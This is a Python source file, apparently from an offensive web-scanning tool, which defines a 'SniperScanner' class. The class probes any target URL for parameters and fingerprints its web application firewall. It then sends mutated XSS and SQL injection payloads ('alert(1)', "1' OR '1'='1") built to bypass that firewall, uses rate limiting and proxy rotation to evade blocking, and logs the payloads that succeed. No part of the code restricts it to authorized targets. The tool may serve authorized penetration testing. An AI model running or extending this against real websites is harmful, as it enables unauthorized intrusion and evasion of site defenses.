import json
import sys
from typing import Callable, Dict, List, Optional, Set

import requests

from backend.config import SniperConfig
from .evidence_collector import EvidenceCollector
from .param_discovery import ParameterDiscoveryEngine
from .rate_limiter import RateLimiter, ProxyRotator
from .vector_matrix import VectorMatrix
from .waf_detector import WAFDetector
from .waf_dictionary import WAFBypassDictionary
from .waf_payloads import PayloadMutator

TelemetryFn = Optional[Callable[[str, Dict], None]]


class SniperScanner:
    """Scanner simplificado do Sniper Mode com bypass de WAF"""

    def __init__(
        self,
        target: str,
        session: Optional[requests.Session] = None,
        on_event: TelemetryFn = None,
    ):
        self.target = target
        self.config = SniperConfig()
        self.session = session or requests.Session()
        self.waf_detector = WAFDetector()
        self.payload_mutator = PayloadMutator()
        self.payload_dictionary = WAFBypassDictionary()
        self.vector_matrix = VectorMatrix()
        self.rate_limiter = RateLimiter(
            min_delay=self.config.SNIPER_MIN_DELAY / 1000,
            max_delay=self.config.SNIPER_MAX_DELAY / 1000,
        )
        self.proxy_rotator = ProxyRotator(self.config.SNIPER_PROXY_LIST)
        self.evidence = EvidenceCollector()
        self.on_event = on_event

        self.stats: Dict[str, any] = {
            "waf_vendor": None,
            "block_mode": None,
            "confidence": 0,
            "attempts": 0,
            "passes": 0,
            "blocks": 0,
            "best_variant": None,
            "blocked_variants": [],
            "vector_stats": {},
            "params_used": [],
            "techniques_applied": [],
            "source": "manual",
        }

    def _emit(self, event_type: str, data: Dict):
        if self.on_event:
            try:
                self.on_event(event_type, data)
            except Exception:
                pass

    def _safe_ja4(self, response) -> Optional[str]:
        """
        Placeholder para JA4/TLS hash.
        Sem acesso ao handshake aqui; retorna None caso não seja possível calcular.
        """
        try:
            import ja4py  # type: ignore
        except Exception:
            return None
        # Ainda não extraímos os dados necessários; reservado para Fase B/C.
        return None

    def run(self, params: List[str], attack_type: str = "xss") -> Dict[str, any]:
        """Executa scan completo para os parâmetros informados ou descobertos automaticamente"""

        vendor_hint = "unknown"

        # Param discovery (auto fallback)
        normalized_params = [p.strip() for p in params if p and p.strip()]
        if not normalized_params:
            discoverer = ParameterDiscoveryEngine(self.target, session=self.session, timeout_seconds=12)
            normalized_params = discoverer.discover_all(use_network=True)
            self.stats["source"] = "auto_probe"
            self.stats["param_discovery"] = discoverer.telemetry.__dict__
        else:
            self.stats["source"] = "manual"

        self.stats["params_used"] = normalized_params

        # WAF detection
        if self.config.SNIPER_WAF_BYPASS:
            probe = self.session.get(self.target)
            ja4_hash = self._safe_ja4(probe)
            waf_info = self.waf_detector.detect(probe, ja4_hash=ja4_hash)
            self.stats.update(
                {
                    "waf_vendor": waf_info.get("vendor"),
                    "block_mode": waf_info.get("mode"),
                    "confidence": waf_info.get("confidence", 0),
                }
            )
            vendor_hint = (
                waf_info.get("vendor")
                if self.config.SNIPER_WAF_VENDOR_HINT == "auto"
                else self.config.SNIPER_WAF_VENDOR_HINT
            )
            self._emit("waf_detected", waf_info)

        techniques: Set[str] = set()

        for param in normalized_params:
            base_payload = "alert(1)" if attack_type == "xss" else "1' OR '1'='1"

            payloads = self.payload_dictionary.get_payloads(vendor_hint, attack_type)
            if not payloads:
                if attack_type == "xss":
                    payloads = self.payload_mutator.mutate(
                        base_payload, vendor_hint, self.config.SNIPER_WAF_VARIANTS_PER_VECTOR
                    )
                else:
                    payloads = self.payload_mutator.mutate_sqli(
                        base_payload, vendor_hint, self.config.SNIPER_WAF_VARIANTS_PER_VECTOR
                    )

            probe_samples = [p["payload"] for p in payloads[:3]] or [base_payload]
            weak_vector = self.vector_matrix.find_weak_vector(
                self.session, self.target, param, probe_samples
            )

            for payload_info in payloads:
                techniques.add(payload_info.get("id", "payload"))

                self.rate_limiter.wait()
                result = self.vector_matrix.test_vector(
                    weak_vector, self.session, self.target, param, payload_info["payload"]
                )

                self.stats["attempts"] += 1

                vec_stats = self.stats["vector_stats"].setdefault(
                    weak_vector, {"tested": 0, "passed": 0, "blocked": 0}
                )
                vec_stats["tested"] += 1

                if result.get("blocked"):
                    self.stats["blocks"] += 1
                    vec_stats["blocked"] += 1
                    self.stats["blocked_variants"].append(payload_info["id"])
                    self.rate_limiter.report_block(True)
                elif result.get("success"):
                    self.stats["passes"] += 1
                    vec_stats["passed"] += 1
                    self.rate_limiter.report_block(False)
                    self.payload_dictionary.record_success(vendor_hint, attack_type, payload_info["payload"])
                    if not self.stats["best_variant"]:
                        self.stats["best_variant"] = payload_info["id"]
                        self.evidence.save_evidence(
                            f"scan_{param}",
                            {
                                "payload": payload_info["payload"],
                                "vector": weak_vector,
                                "response_snippet": result.get("snippet"),
                                "headers": result.get("headers"),
                                "param": param,
                            },
                        )
                else:
                    self.rate_limiter.report_block(False)

                self._emit(
                    "test_result",
                    {
                        "param": param,
                        "payload_id": payload_info["id"],
                        "vector": weak_vector,
                        "blocked": result.get("blocked", False),
                        "status": result.get("status_code"),
                    },
                )

                if self.rate_limiter.consecutive_blocks >= self.config.SNIPER_ROTATE_ON_BLOCKS:
                    proxy = self.proxy_rotator.get_next_proxy()
                    if proxy:
                        self.session.proxies = proxy
                    self.rate_limiter.consecutive_blocks = 0

        self.stats["techniques_applied"] = list(techniques)
        return self.stats


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python -m backend.scanner.sniper <target> [param1,param2|auto] [attack_type]"}))
        sys.exit(1)

    target_arg = sys.argv[1]
    raw_params = sys.argv[2] if len(sys.argv) > 2 else "auto"
    if raw_params.lower() == "auto" or raw_params == "":
        params_arg = []
    else:
        params_arg = raw_params.split(",")
    attack = sys.argv[3] if len(sys.argv) > 3 else "xss"

    scanner = SniperScanner(target_arg)
    result = scanner.run(params_arg, attack)
    print(json.dumps(result))
